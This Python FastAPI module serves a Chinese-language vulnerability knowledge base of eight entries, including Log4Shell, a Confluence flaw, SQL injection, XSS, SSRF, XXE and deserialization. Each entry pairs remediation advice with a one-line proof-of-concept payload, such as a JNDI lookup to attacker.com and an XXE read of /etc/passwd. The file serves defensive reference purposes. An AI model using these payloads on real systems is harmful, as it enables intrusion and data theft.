"""
v9.5 漏洞知识库 - CVE/PoC/修复方案
"""
from fastapi import APIRouter, Query
from fastapi.responses import JSONResponse
from datetime import datetime

router = APIRouter(prefix="/api/v9/kb", tags=["v9-kb"])

# 内置常见漏洞知识库
VULN_KB = {
    "CVE-2021-44228": {
        "name": "Log4Shell (Log4j JNDI注入)",
        "severity": "critical",
        "cvss": 10.0,
        "description": "Apache Log4j2 JNDI features do not protect against attacker-controlled LDAP and other JNDI related endpoints.",
        "affected": "Log4j 2.0-beta9 to 2.14.1",
        "poc": "${jndi:ldap://attacker.com/a}",
        "remediation": "升级到Log4j 2.17.0+，或移除JndiLookup类",
        "tags": ["rce", "java", "log4j", "jndi"]
    },
    "CVE-2023-22515": {
        "name": "Confluence未授权RCE",
        "severity": "critical",
        "cvss": 10.0,
        "description": "Confluence Data Center and Server允许未授权用户创建管理员账户并执行代码",
        "affected": "Confluence Server/Data Center 8.0.0-8.5.1",
        "poc": "/setup/setupadministrator.action",
        "remediation": "升级到8.5.2+",
        "tags": ["rce", "confluence", "unauth"]
    },
    "SQLI": {
        "name": "SQL注入",
        "severity": "high",
        "cvss": 9.8,
        "description": "攻击者可通过注入SQL语句操作数据库",
        "poc": "' OR '1'='1",
        "remediation": "使用参数化查询/预编译语句，输入校验",
        "tags": ["sqli", "owasp-a1"]
    },
    "XSS": {
        "name": "跨站脚本",
        "severity": "medium",
        "cvss": 6.1,
        "description": "攻击者注入恶意脚本到网页",
        "poc": "<script>alert(1)</script>",
        "remediation": "输出编码，CSP头，HttpOnly Cookie",
        "tags": ["xss", "owasp-a7"]
    },
    "SSRF": {
        "name": "服务端请求伪造",
        "severity": "high",
        "cvss": 8.6,
        "description": "诱导服务器发起恶意请求",
        "poc": "http://169.254.169.254/latest/meta-data/",
        "remediation": "URL白名单，禁止内网地址",
        "tags": ["ssrf", "cloud"]
    },
    "XXE": {
        "name": "XML外部实体注入",
        "severity": "high",
        "cvss": 8.2,
        "description": "通过XML实体读取服务器文件",
        "poc": "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>",
        "remediation": "禁用DTD，使用JSON替代XML",
        "tags": ["xxe", "xml"]
    },
    "DESERIALIZE": {
        "name": "Java反序列化",
        "severity": "critical",
        "cvss": 9.8,
        "description": "反序列化不可信数据导致RCE",
        "poc": "ysoserial CommonsCollections5",
        "remediation": "白名单类加载，升级依赖",
        "tags": ["rce", "java", "deserialization"]
    },
    "IDOR": {
        "name": "越权访问",
        "severity": "medium",
        "cvss": 6.5,
        "description": "通过修改ID访问他人数据",
        "poc": "/api/user/123 修改为 /api/user/124",
        "remediation": "对象级权限校验",
        "tags": ["idor", "owasp-a1"]
    },
}


@router.get("/search")
async def search_kb(q: str = Query("", description="搜索关键词")):
    """搜索漏洞知识库"""
    q = q.lower()
    results = {}
    for cve, info in VULN_KB.items():
        if (q in cve.lower() or q in info["name"].lower() or 
            q in info.get("description", "").lower() or
            any(q in t for t in info.get("tags", []))):
            results[cve] = info
    return {"query": q, "results": results, "total": len(results)}


@router.get("/cve/{cve_id}")
async def get_cve(cve_id: str):
    """获取CVE详情"""
    info = VULN_KB.get(cve_id.upper())
    if info:
        return {"cve": cve_id.upper(), **info}
    return JSONResponse(status_code=404, content={"error": "未找到", "cve": cve_id})


@router.get("/list")
async def list_kb():
    """列出所有知识库条目"""
    return {
        "total": len(VULN_KB),
        "vulns": {k: {"name": v["name"], "severity": v["severity"], "cvss": v["cvss"]} 
                  for k, v in VULN_KB.items()}
    }
